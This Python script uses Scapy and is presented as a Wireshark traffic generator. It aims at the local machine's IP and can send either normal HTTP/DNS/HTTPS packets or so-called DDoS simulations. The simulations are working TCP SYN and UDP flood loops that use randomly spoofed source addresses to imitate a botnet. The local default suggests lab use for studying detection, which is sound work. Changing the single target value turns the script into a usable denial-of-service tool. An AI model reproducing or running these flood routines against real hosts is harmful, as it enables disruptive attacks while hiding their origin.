import sys
import time
import random
from scapy.all import IP, TCP, UDP, Raw, send, get_if_addr, conf
import socket

# Setup Target
# Automatically detect local IP
try:
    hostname = socket.gethostname()
    TARGET_IP = socket.gethostbyname(hostname)
except:
    TARGET_IP = "127.0.0.1"

print(f"Targeting Local IP: {TARGET_IP}")

def send_normal_traffic():
    """Generates various types of normal traffic"""
    print(f"\n[+] Sending Normal Traffic to {TARGET_IP}...")
    print("    (Mimicking HTTP, DNS, and HTTPS requests)")
    print("    (Press Ctrl+C to stop this mode)")
    
    try:
        while True:
            # Randomly pick a "normal" protocol
            proto = random.choice(["HTTP", "DNS", "HTTPS"])
            if proto == "HTTP":
                pkt = IP(dst=TARGET_IP)/TCP(dport=80, flags="PA")/Raw(b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
            elif proto == "DNS":
                pkt = IP(dst=TARGET_IP)/UDP(dport=53)/Raw(b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01")
            else:
                pkt = IP(dst=TARGET_IP)/TCP(dport=443, flags="S")
            
            send(pkt, verbose=0)
            time.sleep(random.uniform(0.1, 0.5)) # Natural spacing
    except KeyboardInterrupt:
        print("\n[-] Stopped Normal Traffic.")

def send_ddos_traffic(attack_type):
    """Generates high volume traffic with BURSTS of packets per spoofed IP"""
    print(f"\n[!] STARTING {attack_type} ATTACK on {TARGET_IP}...")
    print("    (Sending smaller bursts of 10 packets per rapidly rotating spoofed IP)")
    print("    (Press Ctrl+C to stop this mode)")
    
    try:
        while True:
            # Rotate IPs extremely fast
            # Using random IPs to look like a global botnet
            spoofed_src = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            # Send a smaller burst (10 packets) very fast
            for _ in range(10): 
                if attack_type == "SYN_FLOOD":
                    sport = random.randint(1024, 65535)
                    pkt = IP(src=spoofed_src, dst=TARGET_IP)/TCP(sport=sport, dport=80, flags="S", window=8192)
                    send(pkt, verbose=0)
                    
                elif attack_type == "UDP_FLOOD":
                    sport = random.randint(1024, 65535)
                    pkt = IP(src=spoofed_src, dst=TARGET_IP)/UDP(sport=sport, dport=random.randint(1, 65535))/Raw(b"X"*64)
                    send(pkt, verbose=0)
            
            # Very tiny pause to allow sniffer to process, but keep rotation high
            time.sleep(0.01)
    except KeyboardInterrupt:
        print(f"\n[-] Stopped {attack_type} attack.")

def main():
    print("==========================================")
    print("    WIRESHARK TRAFFIC GENERATOR (SCAPY)   ")
    print("==========================================")
    print(f"Target IP: {TARGET_IP}")
    print("1. Normal Traffic (HTTP, DNS, HTTPS mix)")
    print("2. DDoS Simulation: TCP SYN Flood (Multi-Source)")
    print("3. DDoS Simulation: UDP Flood (Multi-Source)")
    print("4. Exit")
    print("==========================================")

    while True:
        try:
            user_input = input("\nSelect Option (1-4): ").strip()
            if not user_input:
                continue
            
            choice = user_input
            
            if choice == '1':
                send_normal_traffic()
            elif choice == '2':
                send_ddos_traffic("SYN_FLOOD")
            elif choice == '3':
                send_ddos_traffic("UDP_FLOOD")
            elif choice == '4':
                print("Exiting.")
                sys.exit(0)
            else:
                print("Invalid choice.")
        except (KeyboardInterrupt, EOFError):
            print("\nExiting.")
            sys.exit(0)

if __name__ == "__main__":
    main()
